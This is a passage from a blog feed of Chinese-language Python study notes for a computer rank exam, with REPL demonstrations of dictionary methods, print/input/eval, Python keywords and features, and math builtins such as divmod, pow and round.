class="literal">None</span>, <span class="string">&#x27;key-2&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;key-3&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;key-4&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;key-5&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1.fromkeys(b,<span class="number">2</span>)</span><br><span class="line">&#123;<span class="string">&#x27;key-0&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;key-1&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;key-2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;key-3&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;key-4&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;key-5&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1.fromkeys(b,[<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">&#123;<span class="string">&#x27;key-0&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1 = dict1.fromkeys(b,[<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1</span><br><span class="line">&#123;<span class="string">&#x27;key-0&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;syw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.items()</span><br><span class="line">dict_items([(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;syw&#x27;</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>), (<span class="string">&#x27;school&#x27;</span>, <span class="string">&#x27;stzyjsxy&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;school&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.values()</span><br><span class="line">dict_values([<span class="string">&#x27;syw&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;stzyjsxy&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1</span><br><span class="line">&#123;<span class="string">&#x27;key-0&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.update(dict1)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, </span><br><span class="line"> <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, </span><br><span class="line"> <span class="string">&#x27;key-0&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], </span><br><span class="line"> <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], </span><br><span class="line"> <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], </span><br><span class="line"> <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], </span><br><span class="line"> <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], </span><br><span class="line"> <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-0&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.pop(<span class="string">&#x27;key-0&#x27;</span>)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-5&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.popitem()</span><br><span class="line">(<span class="string">&#x27;key-5&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.setdefault(<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;21WeChat&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;21WeChat&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>, <span class="string">&#x27;key-1&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-2&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-3&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;key-4&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>], <span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;21WeChat&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-复习日志-0001</title>
      <link href="/2023/03/12/Python-Study-0001/"/>
      <url>/2023/03/12/Python-Study-0001/</url>
      
        <content type="html"><![CDATA[<p>Python二级考试快开始了，而明天是打印准考证的日子😅</p><span id="more"></span><p>学安全学其他的还抽不出时间去复习，我是不是要寄了😱<br>先立个flag，今天复习它。<br><a href="http://www.jsjdj.net/ksdg/2871.html">Python二级指导</a></p><h1 id="Python语言基本语法元素"><a href="#Python语言基本语法元素" class="headerlink" title="Python语言基本语法元素"></a>Python语言基本语法元素</h1><ol><li>程序的基本语法元素：程序的格式框架、缩进、注释、变量、命名、保留字、数据类型、赋值<br>语句、引用。</li><li>基本输入输出函数：input() ,eval(),print()。</li><li>源程序的书写风格。</li><li>Python语言的特点。</li></ol><h2 id="Python保留字-关键字"><a href="#Python保留字-关键字" class="headerlink" title="Python保留字(关键字)"></a>Python保留字(关键字)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>inport keyword</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.kwlist</span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;__peg_parser__&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br></pre></td></tr></table></figure><table><thead><tr><th>-</th><th>-</th><th>保留字</th><th>-</th><th>-</th><th>-</th></tr></thead><tbody><tr><td>and</td><td>as</td><td>assert</td><td>break</td><td>class</td><td>continue</td></tr><tr><td>def</td><td>del</td><td>elif</td><td>else</td><td>except</td><td>finally</td></tr><tr><td>for</td><td>from</td><td>False</td><td>global</td><td>if</td><td>import</td></tr><tr><td>in</td><td>is</td><td>lambda</td><td>nonlocal</td><td>not</td><td>None</td></tr><tr><td>or</td><td>pass</td><td>raise</td><td>return</td><td>try</td><td>True</td></tr><tr><td>while</td><td>with</td><td>yield</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><p>相关实例<a href="https://cloud.tencent.com/developer/article/1458486">在这里</a></p><h2 id="基本输出函数"><a href="#基本输出函数" class="headerlink" title="基本输出函数"></a>基本输出函数</h2><h3 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h3><p>打印函数，用于打印值打控制台。</p><p>参数详解：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(*objects, sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=sys.stdout, flush=<span class="literal">False</span>)</span><br><span class="line">objects 复数，表示可以一次输出多个对象。输出多个对象时，需要用英文逗号进行分隔。 </span><br><span class="line">sep     分隔多个对象的元素，可以指定是空格或者其他的参数 ,默认是空格<span class="string">&#x27; &#x27;</span></span><br><span class="line">end     末尾控制，设定以什么字符串为结尾，默认是换行符‘\n’</span><br><span class="line">file    指定要写入的文件对象</span><br><span class="line">flush   输出是否被缓存通常决定于 file，但如果 flush 关键字参数为 <span class="literal">True</span>，流会被强制刷新。</span><br><span class="line"></span><br><span class="line">一般情况下，使用前三个参数就足够了，第四第五个参数可以省略。</span><br></pre></td></tr></table></figure><p>范例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;Python!&quot;</span>,sep=<span class="string">&quot; -=- &quot;</span>,end=<span class="string">&quot;School&quot;</span>)</span><br><span class="line"><span class="comment"># ----------下面是运行---------------- #</span></span><br><span class="line">Hello -=- Python!School</span><br></pre></td></tr></table></figure><h3 id="input函数"><a href="#input函数" class="headerlink" title="input函数"></a>input函数</h3><p>input函数用于获取控制台的输入。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个数字进行判断:&quot;</span>))  </span><br><span class="line"><span class="comment"># ----------下面是运行---------------- #</span></span><br><span class="line">请输入一个数字进行判断: <span class="number">123</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h3><p>eval函数用于执行字符串当中的运算</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;pow(2,5)&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;30*4&quot;</span>))</span><br><span class="line"><span class="comment"># ----------下面是运行---------------- #</span></span><br><span class="line"><span class="number">32</span></span><br><span class="line"><span class="number">120</span></span><br></pre></td></tr></table></figure><h2 id="源程序的书写风格"><a href="#源程序的书写风格" class="headerlink" title="源程序的书写风格"></a>源程序的书写风格</h2><p>引入个Python之禅</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> this</span><br><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"></span><br><span class="line">Beautiful <span class="keyword">is</span> better than ugly.</span><br><span class="line">Explicit <span class="keyword">is</span> better than implicit.</span><br><span class="line">Simple <span class="keyword">is</span> better than <span class="built_in">complex</span>.</span><br><span class="line">Complex <span class="keyword">is</span> better than complicated.</span><br><span class="line">Flat <span class="keyword">is</span> better than nested.</span><br><span class="line">Sparse <span class="keyword">is</span> better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren<span class="string">&#x27;t special enough to break the rules.</span></span><br><span class="line"><span class="string">Although practicality beats purity.</span></span><br><span class="line"><span class="string">Errors should never pass silently.</span></span><br><span class="line"><span class="string">Unless explicitly silenced.</span></span><br><span class="line"><span class="string">In the face of ambiguity, refuse the temptation to guess.</span></span><br><span class="line"><span class="string">There should be one-- and preferably only one --obvious way to do it.</span></span><br><span class="line"><span class="string">Although that way may not be obvious at first unless you&#x27;</span>re Dutch.</span><br><span class="line">Now <span class="keyword">is</span> better than never.</span><br><span class="line">Although never <span class="keyword">is</span> often better than *right* now.</span><br><span class="line">If the implementation <span class="keyword">is</span> hard to explain, it<span class="string">&#x27;s a bad idea.</span></span><br><span class="line"><span class="string">If the implementation is easy to explain, it may be a good idea.</span></span><br><span class="line"><span class="string">Namespaces are one honking great idea -- let&#x27;</span>s do more of those!</span><br></pre></td></tr></table></figure><ul><li>优美胜于丑陋</li><li>明了胜于隐晦</li><li>简洁胜于复杂</li><li>复杂胜于凌乱</li><li>扁平胜于嵌套</li><li>间隔胜于紧凑</li><li>可读性很重要</li><li>即便假借特例的实用性之名，也不要违背上述规则</li><li>除非你确定需要，任何错误都应该有对应</li><li>当存在多种可能，不要尝试去猜测</li><li>只要你不是Guido，对于问题尽量找一种，最好是唯一明显的解决方案</li><li>做也许好过不做，但不假思索就动手还是不如不做</li><li>如果你无法向人描述你的实现方案，那肯定不是一个好方案</li><li>如果实现方案容易解释，可能是个好方案</li><li>命名空间是绝妙的理念，要多运用</li></ul><h2 id="Python语言的特点"><a href="#Python语言的特点" class="headerlink" title="Python语言的特点"></a>Python语言的特点</h2><p>(1) 简单易学<br>Python是一种代表简单主义思想的语言。<br>(2) 面向对象<br>Python既支持面向过程编程,也支持面向对象编程。在“面向过程”的语言中,程序是由过程或仅仅是可重用代码的函数构建起来的。在“面向对象”的语言中,程序是由数据和功能组合而成的对象构建起来的。与其他主要的语言如C++和Java相比, Python以一种非常强大又简单的方式实现面向对象编程。<br>(3) 可移植性<br>由于 Python的开源本质,它已经被移植在许多平台上。如果小心地避免使用依赖于系统的特性,那么所有 Python程序无需修改就可以在下述任何平台上运行,这些平台包括Lnux、Windows、 FreeBSD、 Macintosh、 Solaris、OS/2、Amiga、AROS、AS/400、Beos OS/390、Z/OS、 Palm OS、QNX、VMS、 Psion、 Acorn RISC OS、VxWorks、 PlayStation、 Sharp Zaurus、Windows CE,甚至还有 PocketPC、Symbian以及 Google基于Lnux开发的Android平台。<br>(4) 解释性<br>一个用编译性语言如C或C++写的程序可以从源文件(即C或C++语言)转换到一个计算机使用的语言。这个过程通过编译器和不同的标记、选项完成。当运行程序的时候,连接转载器软件把程序从硬盘复制到内存中并且运行。而Python语言写的程序不需要编译成二进制代码,可以直接从源代码运行程序。在计算机内部,Python解释器把源代码转换成称为字节码的中间形式,然后再把它翻译成计算机使用的机器语言并运行。事实上,由于不再担心如何编译程序,如何确保连接转载正确的库等,这一切使得使用Python变得更加简单。由于只需要把Python程序复制到另外一台计算机上,它就可以工作了,这也使得Python程序更加易于移植。<br>(5) 开源<br>Python是 FLOSS(自由/开放源码软件)之一。简单地说,你可以自由地发布这个软件的拷贝,阅读它的源代码,对它做改动,把它的一部分用于新的自由软件中。 FLOSS是基于一个团体分享知识的概念,这是为什么Python如此优秀的原因之一 ——它是由一群希望看到一个更加优秀的 Python的人创造并经常改进这的。<br>(6) 高级语言<br>Python是高级语言。当使用 Python语言编写程序时,无需再考虑诸如如何管理程序使用的内存一类的底层细节。<br>(7) 可扩展性<br>如果需要一段关键代码运行的更快或者希望某些算法不公开,就可以把部分程序用C或C语言编写,然后在 Python程序中使用它们。<br>(8) 丰富的库<br>Python标准库确实很庞大,它可以帮助你处理各种工作,包括正则表达式、文档生成、单元测试、线程、数据库、网页浏览器、CGl、FTP、电子邮件、XML、XML-RPC、HTML、WAV文件、密码系统、GU(图形用户界面)Tk和其他与系统有关的操作。记住,只要安装了 Python,所有这些功能都是可用的,这被称作 Python的“功能齐全”理念。除了标准库以外,还有许多其他高质量的库,如 wXPython、 Twisted和Pyon图像库等。<br>(9) 规范的代码<br>Python采用强制缩进的方式使得代码具有极佳的可读性。</p><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><ol><li>数字类型：整数类型、浮点数类型和复数类型。</li><li>数字类型的运算：数值运算操作符、数值运算函数。</li><li>真假无：True、False、None。</li><li>字符串类型及格式化：索引、切片、基本的format()格式化方法。</li><li>字符串类型的操作：字符串操作符、操作函数和操作方法。</li><li>类型判断合类型间转换。</li><li>逻辑运算和比较运算。</li></ol><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>数字类型：整数类型int()、浮点数类型float()和复数类型complex()。</p><h3 id="复数类型complex"><a href="#复数类型complex" class="headerlink" title="复数类型complex"></a>复数类型complex</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=a+bi</span><br><span class="line">a 实部</span><br><span class="line">b 虚部</span><br><span class="line">i 虚部单位</span><br><span class="line"><span class="comment"># ------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="comment"># 当前版本3.9</span></span><br><span class="line">&gt;&gt;&gt;&gt; num = <span class="number">12</span>+<span class="number">3j</span></span><br><span class="line">&gt;&gt;&gt;&gt; num</span><br><span class="line">(<span class="number">12</span>+<span class="number">3j</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num.real</span><br><span class="line"><span class="number">12.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num.imag</span><br><span class="line"><span class="number">3.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">complex</span>(num)</span><br><span class="line">(<span class="number">12</span>+<span class="number">3j</span>)</span><br></pre></td></tr></table></figure><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><h4 id="divmod"><a href="#divmod" class="headerlink" title="divmod"></a>divmod</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">divmod</span>(x,y,/)</span><br><span class="line">输入x,y，返回元组（x//y， x%y）</span><br><span class="line"><span class="comment"># ------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">12</span>,<span class="number">5</span>)</span><br><span class="line">(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">12.0</span>,<span class="number">5.0</span>)</span><br><span class="line">(<span class="number">2.0</span>,<span class="number">2.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">12</span>,<span class="number">2</span>)</span><br><span class="line">(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="abs数字绝对值"><a href="#abs数字绝对值" class="headerlink" title="abs数字绝对值"></a>abs数字绝对值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">abs</span>(num)</span><br><span class="line">传入一个数字，给出它的绝对值</span><br><span class="line"><span class="comment"># ------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(-<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="number">12</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(-<span class="number">9</span>)</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure><h4 id="pow指数运算"><a href="#pow指数运算" class="headerlink" title="pow指数运算"></a>pow指数运算</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pow</span>(base,exp,mode=<span class="literal">None</span>)</span><br><span class="line">mode参数默认是禁止的，可以自己加上。为此，存在两种情况</span><br><span class="line"><span class="number">1.</span>num = <span class="built_in">pow</span>(base,exp) ==等价于==&gt; base的exp次方 ==等价于==&gt; base**exp</span><br><span class="line"><span class="number">2.</span>num = <span class="built_in">pow</span>(base,exp,mode) ==等价于==&gt; base的exp次方的模 ==等价于==&gt; base**exp%mode</span><br><span class="line"><span class="comment"># ------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"><span class="number">32</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="round小数四舍五入"><a href="#round小数四舍五入" class="headerlink" title="round小数四舍五入"></a>round小数四舍五入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">round</span>(base,mode=<span class="literal">None</span>)</span><br><span class="line">参数有两个，和上面一样，有两种情况：</span><br><span class="line">num = <span class="built_in">round</span>(base)      ==&gt; 相当于把所有的小数四舍五入掉，只保留整数</span><br><span class="line">num = <span class="built_in">round</span>(base,mode) ==&gt; 相当于把小数位保留到mode位，其余小数位四舍五入</span><br><span class="line">上述是针对小数的，丢个整数进去是没有任何效果的。</span><br><span class="line"><span class="comment"># ------下面是基于CMD窗口的运算------ #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">12.3</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">12.3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">12.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">12.333333</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">12.333</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">12.333555</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">12.334</span>  -&gt; 出现四舍五入了</span><br></pre></td></tr></table></figure><h4 id="max与min返回列表最大最小值"><a href="#max与min返回列表最大最小值" class="headerlink" title="max与min返回列表最大最小值"></a>max与min返回列表最大最小值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">max</span>(...)</span><br><span class="line">上个原始注解：</span><br><span class="line">    <span class="built_in">max</span>（可迭代，*[，默认=obj，key=func]）-&gt;值</span><br><span class="line">    <span class="built_in">max</span>（arg1， arg2，*args，*[，key=func]）-&gt;值</span><br><span class="line">    使用单个可迭代参数，返回其最大的项目。这</span><br><span class="line">    默认仅关键字参数指定要返回的对象，如果</span><br><span class="line">    提供的可迭代对象为空。</span><br><span class="line">    使用两个或多个参数，返回最大的参数。</span><br><span class="line"><span class="comment"># 恕我冒昧，这原始注解我不是看的很懂</span></span><br><span class="line"><span class="comment"># 